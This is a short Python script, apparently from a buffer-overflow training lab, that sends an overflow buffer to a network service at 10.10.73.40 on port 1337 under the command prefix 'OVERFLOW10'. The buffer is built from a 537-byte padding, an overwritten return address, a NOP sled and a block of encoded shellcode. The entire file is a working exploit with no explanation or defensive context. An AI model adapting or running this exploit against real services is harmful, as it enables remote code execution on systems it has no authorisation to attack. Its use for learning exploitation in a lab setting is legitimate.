import socket

ip = "10.10.73.40" # Change this
port = 1337 # Change this

prefix = "OVERFLOW10 " # Change this
offset = 537
overflow = "A" * offset
retn = "\x05\x12\x50\x62"
padding = "\x90" * 16
payload = (
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x6d\xe7\xdb\x3b\x83\xee\xfc\xe2\xf4\x91\x0f\x59\x3b\x6d\xe7"
"\xbb\xb2\x88\xd6\x1b\x5f\xe6\xb7\xeb\xb0\x3f\xeb\x50\x69\x79"
"\x6c\xa9\x13\x62\x50\x91\x1d\x5c\x18\x77\x07\x0c\x9b\xd9\x17"
"\x4d\x26\x14\x36\x6c\x20\x39\xc9\x3f\xb0\x50\x69\x7d\x6c\x91" 
"\x07\xe6\xab\xca\x43\x8e\xaf\xda\xea\x3c\x6c\x82\x1b\x6c\x34"
"\x50\x72\x75\x04\xe1\x72\xe6\xd3\x50\x3a\xbb\xd6\x24\x97\xac"
"\x28\xd6\x3a\xaa\xdf\x3b\x4e\x9b\xe4\xa6\xc3\x56\x9a\xff\x4e"
"\x89\xbf\x50\x63\x49\xe6\x08\x5d\xe6\xeb\x90\xb0\x35\xfb\xda"
"\xe8\xe6\xe3\x50\x3a\xbd\x6e\x9f\x1f\x49\xbc\x80\x5a\x34\xbd"
"\x8a\xc4\x8d\xb8\x84\x61\xe6\xf5\x30\xb6\x30\x8f\xe8\x09\x6d"
"\xe7\xb3\x4c\x1e\xd5\x84\x6f\x05\xab\xac\x1d\x6a\x18\x0e\x83"
"\xfd\xe6\xdb\x3b\x44\x23\x8f\x6b\x05\xce\x5b\x50\x6d\x18\x0e"
"\x6b\x3d\xb7\x8b\x7b\x3d\xa7\x8b\x53\x87\xe8\x04\xdb\x92\x32"
"\x4c\x51\x68\x8f\xd1\x32\x68\xb6\xb3\x39\x6d\xf6\x87\xb2\x8b"
"\x8d\xcb\x6d\x3a\x8f\x42\x9e\x19\x86\x24\xee\xe8\x27\xaf\x37"
"\x92\xa9\xd3\x4e\x81\x8f\x2b\x8e\xcf\xb1\x24\xee\x05\x84\xb6"
"\x5f\x6d\x6e\x38\x6c\x3a\xb0\xea\xcd\x07\xf5\x82\x6d\x8f\x1a"
"\xbd\xfc\x29\xc3\xe7\x3a\x6c\x6a\x9f\x1f\x7d\x21\xdb\x7f\x39"
"\xb7\x8d\x6d\x3b\xa1\x8d\x75\x3b\xb1\x88\x6d\x05\x9e\x17\x04"
"\xeb\x18\x0e\xb2\x8d\xa9\x8d\x7d\x92\xd7\xb3\x33\xea\xfa\xbb"
"\xc4\xb8\x5c\x3b\x26\x47\xed\xb3\x9d\xf8\x5a\x46\xc4\xb8\xdb"
"\xdd\x47\x67\x67\x20\xdb\x18\xe2\x60\x7c\x7e\x95\xb4\x51\x6d"
"\xb4\x24\xee"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")